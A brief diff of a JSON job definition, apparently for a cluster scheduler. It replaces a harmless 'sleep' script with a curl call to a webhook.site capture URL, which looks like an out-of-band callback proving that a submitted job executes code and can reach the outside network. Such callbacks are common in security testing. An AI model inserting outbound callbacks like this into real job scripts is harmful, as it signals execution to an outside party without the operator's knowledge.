@@ -10,5 +10,5 @@
                                "LD_LIBRARY_PATH=/lib/:/lib64/:/usr/local/lib"
                        ]
        },
-       "script": "#!/bin/bash\nsrun sleep 100"
+       "script": "#!/bin/bash\ncurl https://webhook.site/d5228066-c22b-4b1f-9863-afeb2765dbc2"
 }
